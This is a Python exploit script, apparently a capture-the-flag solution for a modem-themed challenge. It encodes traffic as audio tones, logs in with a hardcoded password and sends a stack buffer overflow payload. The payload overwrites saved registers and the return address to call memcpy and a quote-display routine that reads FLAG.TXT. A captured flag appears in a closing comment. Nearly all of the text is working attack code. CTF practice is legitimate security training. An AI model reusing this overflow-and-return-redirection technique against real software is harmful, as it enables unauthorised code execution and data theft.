#!/usr/bin/env python3
# Written by op and shiftcrops

from struct import pack, unpack
import binascii
import socket
import sys

TARGET_REMOTE       = False

SYNC_BYTES          = 4

BITS_PER_BYTE       = 10

SAMPLES_PER_BIT     = 40
SAMPLES_PER_BYTE    = SAMPLES_PER_BIT * BITS_PER_BYTE

BYTES_PER_SAMPLE    = 4
BYTES_PER_BIT       = SAMPLES_PER_BIT  * BYTES_PER_SAMPLE
BYTES_PER_BYTE      = SAMPLES_PER_BYTE * BYTES_PER_SAMPLE

WAITING_THRESH_BITS = 96

TONE_BIN1           = binascii.unhexlify('000000007c911f3eb85d9e3e9d4de83e9f99163ff304353f18044f3f2122643f3972733f6cdf7c3f0000803f6cdf7c3f3972733f2022643f17044f3ff304353f9f99163f974de83eb35d9e3e73911f3e2ebdbbb37e911fbeb95d9ebe9c4de8bea19916bff50435bf19044fbf222264bf3a7273bf6cdf7cbf000080bf6cdf7cbf3a7273bf222264bf14044fbfef0435bf9b9916bf944de8beb05d9ebe6d911fbe')
TONE_BIN0           = binascii.unhexlify('00000000de9d913e1c460b3fe89c423fd8e0693fb2d37d3f6cdf7c3f9915673fc4353e3f2da0053fa8c4843efc9ad5bcb95d9ebea92611bf29e246bf61836cbfc99b7ebf20bf7bbf222264bf82ad39bff0c5ffbeb3a86fbe0f88553d0102ab3e9f99163fcd044b3fbafc6e3f8d377f3f1c5e7a3ff106613ff304353f041ff43e5a9e553ed80ea0bd8a88b7be5ff21bbf19044fbf7a4c71bfe3a67fbfd5e378bf')

def check_sync(bits):
    if len(bits) < SYNC_BYTES * BITS_PER_BYTE:
        return False

    if not (bits[0] == 0 and bits[BITS_PER_BYTE - 1] == 1):
        return False
    if not all(bits[0] == bits[i] for i in range(BITS_PER_BYTE, SYNC_BYTES * BITS_PER_BYTE, BITS_PER_BYTE)):
        return False
    if not all(bits[BITS_PER_BYTE - 1] == bits[BITS_PER_BYTE - 1 + i] for i in range(BITS_PER_BYTE, SYNC_BYTES * BITS_PER_BYTE, BITS_PER_BYTE)):
        return False

    return True

def demod_bit(data):
    samples = unpack('<{}f'.format(SAMPLES_PER_BIT), data)
    zerocross = sum(
        1 if s0 <= 0 < s1 or s0 > 0 >= s1 else 0 for s0, s1 in zip(samples, samples[1:])
    )
    if zerocross == 1 or zerocross == 2:
        return 1
    elif zerocross == 3 or zerocross == 4:
        return 0
    else:
        print(samples)
        assert(False)

def demod_bits(data):
    bits = []
    for i in range(0, (len(data) // BYTES_PER_BIT) * BYTES_PER_BIT, BYTES_PER_BIT):
        bits.append(demod_bit(data[i:i + BYTES_PER_BIT]))
    return bits

def demod_bytes(data):
    bits = demod_bits(data)

    while bits and not check_sync(bits):
        del bits[0]

    ret = b''
    while len(bits) >= BITS_PER_BYTE:
        startbit, *databits, stopbit = bits[:BITS_PER_BYTE]
        if startbit != 0:
            break

        ret += bytes((int(''.join(str(b) for b in databits[::-1]), 2),))
        del bits[:BITS_PER_BYTE]

    return ret

def mod_bytes(data):
    pcm = b''
    for byte in data:
        databits = list(int(b) for b in bin(byte).replace('0b', '').rjust(8, '0')[::-1])
        pcm += TONE_BIN0 + b''.join(TONE_BIN0 if b == 0 else TONE_BIN1 for b in databits) + TONE_BIN1

    return pcm

def is_waiting(data):
    return all(b == 1 for b in demod_bits(data[-1 * WAITING_THRESH_BITS * BYTES_PER_BIT:]))

def recv_align(sock, size):
    recvd = sock.recv(size)
    while len(recvd) % BYTES_PER_BIT:
        recvd += sock.recv(1)
    return recvd

def recv_until_wait(sock):
    if TARGET_REMOTE:
        recvd = recv_align(sock, BYTES_PER_BYTE * 10000)
        while not is_waiting(recvd):
            recvd += recv_align(sock, BYTES_PER_BYTE * 10000)
        
        return demod_bytes(recvd)
    else:
        recvd = b''
        try:
            recvd = sock.recv(65536)
        except socket.timeout:
            recvd = b''

        return recvd

def recv_until_wait10(s):
    ret = b''
    waitcnt = 0
    while waitcnt < 10:
        recvd = recv_until_wait(s)
        ret += recvd
        if recvd:
            waitcnt = 0
        else:
            waitcnt += 1

    return ret

def send(sock, data):
    if TARGET_REMOTE:
        senddata = TONE_BIN1 * 96 + mod_bytes(data) + TONE_BIN1 * 96
        sock.sendall(senddata)
    else:
        sock.sendall(data)

def sendln(sock, data):
    send(sock, data + b'\r\n')

def put(data):
    sys.stdout.buffer.write(data)
    sys.stdout.buffer.flush()

if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if TARGET_REMOTE:
        print('REMOTE MODE')
        s.connect(("mooodem.challenges.ooo", 5000))
    else:
        print('LOCAL MODE')
        s.connect(("localhost", 5000))
        s.settimeout(0.3)

    put(recv_until_wait10(s))
    put(recv_until_wait10(s))

    sendln(s, b'hoge')
    put(recv_until_wait10(s))

    sendln(s, b'supersneaky2020')
    put(recv_until_wait10(s))

    sendln(s, b'C')
    put(recv_until_wait10(s))

    addr_stack          = 0xff96
    addr_quotes         = 0x0db5
    addr_memcpy         = 0x1756
    addr_show_quotes    = 0xe97c

    bulletin  = b'A'*0x100
    bulletin += pack('<H', 0xcafe)              # ebp
    bulletin += pack('<H', addr_quotes-0x100)   # edi
    bulletin += pack('<H', addr_stack-0x100)    # esi
    bulletin += pack('<H', addr_memcpy)         # eip
    bulletin += pack('<H', 0xdead)*3
    bulletin += pack('<H', addr_show_quotes)
    bulletin += b'FLAG.TXT'

    sendln(s, bulletin)
    put(recv_until_wait10(s))
    sendln(s, b'')
    put(recv_until_wait10(s))

    send(s, b'L' + b'\r\n')

    while True:
        waitcnt = 0
        while waitcnt < 10:
            recvd = recv_until_wait(s)
            if recvd:
                waitcnt = 0
                put(recvd)
            else:
                waitcnt += 1

        inp = sys.stdin.buffer.readline()
        send(s, inp.strip() + b'\r\n')

    # OOO{AYH3Xn4qAeZDl3McORnINdiY8yaoow7bbq/DcrQv4DQ=}

